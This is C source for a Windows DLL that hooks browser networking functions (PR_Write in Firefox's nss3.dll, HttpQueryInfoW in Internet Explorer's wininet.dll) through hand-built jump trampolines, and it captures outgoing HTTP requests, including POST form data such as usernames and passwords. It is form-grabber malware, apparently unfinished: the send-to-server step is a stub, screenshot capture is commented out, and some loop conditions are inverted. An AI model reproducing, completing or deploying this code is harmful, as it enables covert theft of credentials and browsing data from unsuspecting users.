#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <shlwapi.h>
#include <Wininet.h>

#pragma warning(disable: 4996) // strcpy_s

#define ARG_LONGPOINTER(x, y) &(y = sizeof(x))

enum BrowserType {
	BROWSER_FIREFOX = 0,
	BROWSER_CHROME,
	BROWSER_EDGE,
	BROWSER_OPERA,
	BROWSER_IE
};

BOOL ThreadSendAllData();
void IdentifyAndActivate( );
void TrampolineInMemoryPasive( unsigned long int addr_from, unsigned long int addr_to, unsigned int padding );
void SetMonitorInBrowser( int type_browser );
void *SearchInMemory( void *data, size_t size_data, void *pattern, size_t size_pattern, size_t padding );
void CreateHTTPRequest( char *method, char *hostname, char *path, char *form_data, unsigned long fd, bool wait_form );
void SetFormData(unsigned int fd, char *formdata, int sizeform);
void _stdcall GetHTTPHeaderFirefoxAndChrome( unsigned long *stack );
void _stdcall GetHTTPHeaderIE( unsigned long *stack );

typedef struct _browserdata {
	char method[5];
	char hostname[256];
	char path[512];
	char form_data[1024];
	char cookie[1024];
	unsigned long fd_index;
	bool wait_form; /* HTTP2 chunk data */
	bool is_send; /* only for debug */
	struct _browserdata *next;
} browserdata;

typedef struct _infohook {
	void *heap_addr;
	int heap_size;
} infohook;

typedef struct _datahook {
	bool is_post;
} datahook;

/*
BOOLAPI HttpQueryInfoA(
    __in HINTERNET hRequest,
    __in DWORD dwInfoLevel,
    __inout_bcount_opt(*lpdwBufferLength) LPVOID lpBuffer,
    __inout LPDWORD lpdwBufferLength,
    __inout_opt LPDWORD lpdwIndex
    );
		*/

browserdata *g_firts_httpdata, *g_last_httpdata;
bool g_detachdll;

BOOL APIENTRY DllMain( HMODULE basemodule, unsigned long status, void *_reserverd ) {
	if ( DLL_PROCESS_ATTACH == status ) {
#ifdef _XDEBUG
		AllocConsole();
		freopen("CONOUT$", "w", stdout);
#endif
		g_firts_httpdata = g_last_httpdata = NULL;
		g_detachdll = false;

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ThreadSendAllData, NULL, 0, NULL);
		IdentifyAndActivate();
	} else if ( DLL_PROCESS_DETACH ) {
		g_detachdll = true;
		// Clean heap
	}

	return TRUE;
}

BOOL ThreadSendAllData() {
	browserdata *aux = NULL;

	while ( g_detachdll != false ) {
		if ( NULL == aux ) {
			aux = g_firts_httpdata;
			Sleep(1000); continue;
		}

		if ( false == aux->is_send ) {
			printf("[http2] method: %s; host: %s; path: %s; form: %s\n", aux->method, 
			aux->hostname, aux->path, aux->form_data);
			aux->is_send = true;
		}

		aux = aux->next;
		/* sending data to server*/
	}

	return TRUE;
}

void IdentifyAndActivate( ) {
	wchar_t *file_name = NULL, filename_lower[MAX_PATH] = {0}, full_path[MAX_PATH] = {0};
	wchar_t *aux;

	GetModuleFileName(NULL, full_path, sizeof (full_path));
	file_name = PathFindFileName(full_path);
	aux = file_name; 
	for (int i = 0; L'\0' != *aux; i++, aux++) filename_lower[i] = towlower(*aux);
	if (wcscmp(filename_lower, L"firefox.exe") == 0 ) SetMonitorInBrowser(BROWSER_FIREFOX); 
	else if (wcscmp(filename_lower, L"iexplore.exe") == 0 ) SetMonitorInBrowser(BROWSER_IE);
}

void TrampolineInMemoryPasive( unsigned long int addr_from, unsigned long int addr_to, unsigned int padding ) {
	unsigned long vprotect, size_opcode = 0;
	long jmp_calc = 0;
	void *n_pages = NULL;
	unsigned char opcode_code[32] = {0x54, /* push esp */ 0xE8, 0x0, 0x0, 0x0, 0x0, /* call */ 
		0xE9, 0x0, 0x0, 0x0, 0x0 /* jmp */}, opcode_ret[5] = {0xE9, 0x0, 0x0, 0x0, 0x0 /* return normal register */}; 

	memset(&opcode_code[11], 0x90, 21); 
	size_opcode = 11 + padding;
	VirtualProtect((void *) addr_from, size_opcode, PAGE_EXECUTE_READWRITE, &vprotect);
	n_pages = VirtualAlloc(NULL, size_opcode + 5, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	jmp_calc = (addr_to - (addr_from + 1) - 5);
	memcpy(&opcode_code[2], &jmp_calc, 4);
	memcpy(n_pages, (void *) addr_from, size_opcode); /* backup */
	jmp_calc = (addr_from + size_opcode) - ((long) n_pages + size_opcode) - 5; 
	memcpy(&opcode_ret[1], &jmp_calc, 4);
	memcpy((void *) ((long) n_pages + size_opcode), &opcode_ret[0], sizeof(opcode_ret));
	jmp_calc = ((long) n_pages - (addr_from + 6)) - 5;
	memcpy(&opcode_code[7], &jmp_calc, 4);
	memcpy((void *) addr_from, &opcode_code[0], size_opcode);
	VirtualProtect((LPVOID) addr_from, size_opcode, vprotect, &vprotect);
}

/*

void GetScreenShot(void) {
	int w, h;
	HDC hscreen, hdc;
	HBITMAP hbitmap;
	HGDIOBJ old_context;
	RECT wattr = {0};

	GetWindowRect(GetActiveWindow(), &wattr);
	w = abs(wattr.left-wattr.right);
	h = abs(wattr.bottom-wattr.top);
	hscreen = GetDC(NULL);
	hdc = CreateCompatibleDC(hscreen);
	hbitmap = CreateCompatibleBitmap(hscreen, 400, 400);
	old_context = SelectObject(hdc, hbitmap);
	SetStretchBltMode(hdc, HALFTONE);
	StretchBlt(hdc, 0, 0, 400, 400, hscreen, wattr.left, wattr.top, w, h, SRCCOPY);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_BITMAP, hbitmap);
	CloseClipboard();
	// Save temp & send
	SelectObject(hdc, old_context);
	DeleteDC(hdc);
	ReleaseDC(NULL, hscreen);
	DeleteObject(hbitmap);
}
*/

void SetMonitorInBrowser( int type_browser ) {
	unsigned long addr_from, addr_to;
	
	switch ( type_browser ) {
		case BROWSER_FIREFOX: 
			addr_from = (unsigned long) GetProcAddress(GetModuleHandle(L"nss3.dll"), "PR_Write");
			addr_to = (unsigned long) GetHTTPHeaderFirefoxAndChrome;
		break;
		case BROWSER_CHROME:
		break;
		case BROWSER_IE:
			addr_from = (unsigned long) GetProcAddress(GetModuleHandle(L"wininet.dll"), "HttpQueryInfoW");
			addr_to = (unsigned long) GetHTTPHeaderIE;
		break;
	}

	if ( !addr_from )  return;
	TrampolineInMemoryPasive(addr_from, addr_to, 1 /* padding nop */);
}

void *SearchInMemory( void *data, size_t size_data, void *pattern, size_t size_pattern, size_t padding ) {
	void *foundchr = NULL, *addr = data;
	int *val = (int *) pattern;

	while ( NULL != (foundchr = memchr(addr, *val, size_data)) ) {
		if ( 0 == memcmp(foundchr, pattern, size_pattern) ) 
			return ( !padding ) ? foundchr : (void *) ((unsigned long) foundchr + padding + size_pattern);
		addr = (void *) ((unsigned long) foundchr + size_pattern);
	}

	return NULL;
}

void CreateHTTPRequest( char *method, char *hostname, char *path, char *form_data, unsigned long fd, bool wait_form ) {
	browserdata *aux;

	if ( false == g_detachdll ) return; 
	if ( NULL == (aux = (browserdata *) malloc(sizeof(browserdata))) ) return;

	if ( NULL != g_firts_httpdata && NULL != g_last_httpdata ) {
		g_last_httpdata->next = aux;
		g_last_httpdata = aux;
	} else g_firts_httpdata = g_last_httpdata = aux; 

	memset(aux, 0, sizeof(browserdata));
	aux->is_send = false;
	aux->wait_form = wait_form;
	aux->fd_index = fd;
	aux->next = NULL;
	strncpy(aux->method, method, (sizeof(aux->method)) -1);
	strncpy(aux->hostname, hostname, (sizeof(aux->hostname)) -1);
	strncpy(aux->path, path, (sizeof(aux->path)) -1);
	if ( NULL != form_data ) strncpy(aux->form_data, form_data, (sizeof(aux->form_data)) -1);
}

void SetFormData(unsigned long fd, char *formdata, int sizeform) {
	browserdata *aux = g_firts_httpdata;
	if ( fd == 0 || false == g_detachdll) return;

	while ( aux != NULL ) {
		if ( fd == aux->fd_index && true == aux->wait_form ) {
			char chrbk = formdata[sizeform];
			formdata[sizeform] = '\0';
			strncpy(aux->form_data, (const char *) ((unsigned long) formdata + 8), (sizeof(aux->form_data))-1);
			formdata[sizeform] = chrbk;
			aux->wait_form = false;
			aux->fd_index = 0;
		}

		aux = aux->next;
	}

	/* always waiting for handle */
}

void _stdcall GetHTTPHeaderFirefoxAndChrome( unsigned long *stack ) {
	unsigned long *fd_stream = (unsigned long *) stack[1];
	char *http_header = (char *) stack[2], *_method, *_path, *_host, *_form;
	int size_header = stack[3];
	unsigned char sig_http[4] = {0x80, 0x03, 0x00, 0x01}; /* http chunk data */
	bool wait_next_stream = false, wait_form = false;

	_method = _path = _host = _form = NULL;
	if ( 4 < size_header && (0 == memcmp(http_header, "POST", 4) || 0 == memcmp(http_header, "GET", 3)) ) {
		char *next_token, *token, *http_tmp = NULL, *form_data;
		int size_type = 0;

		if ( 'P' == *http_header ) size_type = 5;
		else if ( 'G' == *http_header ) size_type = 4;
		if ( NULL == ( http_tmp = (char *) malloc(size_header)) ) return;
		memcpy(http_tmp, http_header, size_header);
		token = strtok_s(http_tmp, "\r\n", &next_token);

		while ( NULL != token ) {
			if ( 0 == memcmp(token, "GET", 3) || 0 == memcmp(token, "POST", 4) ) {
				char *_tmp = (char *) ((unsigned long) token + size_type);
				*(_tmp-1) = '\0'; _method = token;
				for (_path = _tmp; *_tmp != '\0'; _tmp++ ) if ( *_tmp == ' ' ) *_tmp = '\0';
			} else if ( 0 == memcmp(token, "Host:", 5) ) {
				_host = (char *) ((unsigned long) token + 6);
			} else if ( 0 == memcmp(token, "Content-Length:", 15) && 0 != memcmp(token, "Content-Length: 0", 17) ) {
				wait_form = true;
			}

			form_data = token;
			token = strtok_s(NULL, "\r\n", &next_token);
			if ( NULL == token && true == wait_form) _form = form_data;
		}
		CreateHTTPRequest(_method, _host, _path, _form, 0, false);
		free(http_tmp);
	} else if ( 60 <= size_header && 0 == memcmp(http_header, sig_http, sizeof(sig_http)) ) {
		_method = (char *) SearchInMemory(http_header, size_header, ":method", strlen(":method"), 4);
		_path = (char *) SearchInMemory(http_header, size_header, ":path", strlen(":path"), 4);
		_host = (char *) SearchInMemory(http_header, size_header, ":host", strlen(":host"), 4);
		
		char *content_size = (char *) SearchInMemory(http_header, size_header, "content-length", strlen("content-length"), 4);
		if ( NULL != content_size && '0' != *content_size ) {
			wait_form = true;
			wait_next_stream = true;
		}
		CreateHTTPRequest(_method, _host, _path, NULL, (unsigned long) fd_stream, wait_form);
	}

	/* waiting */
	if ( true != wait_next_stream ) SetFormData((unsigned long) fd_stream, http_header, size_header);
}
	
/* 
	1: [esp+4] 00CC000C 
	2: [esp+8] 05580788 L"Referer: http://localhost/bhook/test.html ...	
	3: [esp+C] FFFFFFFF 
	4: [esp+10] 00491BA0 "username=test&password=test"
	5: [esp+14] 0000001B 
	6: [esp+18] 034CABC0 
	7: [esp+1C] 7614EE80 urlmon.7614EE80
*/

void _stdcall GetHTTPHeaderIE( unsigned long *stack ) {
	char hostname[512] = {0}, method[5] = {0}, header[512];
	unsigned long size_buf, infolevel = (unsigned long) stack[2];
	void *handle = (void *) stack[1];

	if ( HTTP_QUERY_RAW_HEADERS_CRLF == infolevel ) {
		HttpQueryInfoA(handle, HTTP_QUERY_URI, (void *) header, ARG_LONGPOINTER(header, size_buf), NULL);
		//HttpQueryInfoA(handle, HTTP_QUERY_HOST | HTTP_QUERY_FLAG_REQUEST_HEADERS, (void *) hostname, ARG_LONGPOINTER(hostname, size_buf), NULL);
		//HttpQueryInfoA(handle, HTTP_QUERY_CONTENT_BASE, (void *) method, ARG_LONGPOINTER(method, size_buf), NULL);
		MessageBoxA(NULL, header, "", MB_OK);
	}

	/*if ( (unsigned long) handle_last == (unsigned long) handle ) return;
	else {
		HttpQueryInfoA(handle, HTTP_QUERY_HOST | HTTP_QUERY_FLAG_REQUEST_HEADERS, (void *) buf, &size_buf, NULL);
		//MessageBoxA(NULL, buf, "", MB_OK);
	}*/
}
